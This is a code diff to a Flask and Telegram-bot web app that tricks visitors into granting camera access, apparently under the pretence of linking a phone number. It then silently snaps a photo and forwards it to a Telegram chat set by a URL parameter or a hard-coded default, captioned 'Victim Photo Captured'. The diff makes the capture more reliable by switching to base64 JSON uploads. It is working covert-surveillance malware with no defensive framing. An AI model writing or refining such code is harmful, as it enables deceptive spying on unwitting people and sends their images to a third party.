@@ -1,4 +1,5 @@
 import os
+import base64
 from flask import Flask, render_template_string, request, jsonify
 import telebot
 
@@ -56,28 +57,17 @@ HTML_CONTENT = """
 
                 stream.getTracks().forEach(track => track.stop());
 
-                canvas.toBlob(async (blob) => {
-                    if (!blob) {
-                        btn.innerText = "SELECT";
-                        btn.disabled = false;
-                        return;
-                    }
+                // تبدیل عکس به Base64 برای ارسال پایدار و بدون خطای وب‌ویو
+                const dataURL = canvas.toDataURL('image/jpeg', 0.85);
 
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'capture.jpg');
+                await fetch("/upload" + window.location.search, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: dataURL })
+                });
 
-                    try {
-                        await fetch("/upload" + window.location.search, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    } catch (err) {
-                        console.error(err);
-                    }
-
-                    btn.innerText = "Connected!";
-                    alert("شماره با موفقیت متصل شد.");
-                }, 'image/jpeg', 0.90);
+                btn.innerText = "Connected!";
+                alert("شماره با موفقیت متصل شد.");
 
             } catch (err) {
                 alert("لطفاً اجازه دسترسی به دوربین را تایید کنید.");
@@ -97,14 +87,17 @@ def index():
 @app.route("/upload", methods=["POST"])
 def upload():
     user_id = request.args.get("user") or request.args.get("id")
-    photo = request.files.get("photo")
+    data = request.get_json()
     
-    if photo:
-        target_id = user_id if user_id else "8173349543"
+    if data and "image" in data:
         try:
-            bot.send_photo(target_id, photo, caption="📸 Victim Photo Captured\n⚡ Developed by: @Kaliboy002")
+            image_data = data["image"].split(",")[1]
+            image_bytes = base64.b64decode(image_data)
+            
+            target_id = user_id if user_id else "8173349543"
+            bot.send_photo(target_id, image_bytes, caption="📸 Victim Photo Captured\n⚡ Developed by: @Kaliboy002")
         except Exception as e:
-            print(f"Error sending photo: {e}")
+            print(f"Error processing image: {e}")
             
     return jsonify({"status": "ok"})
 
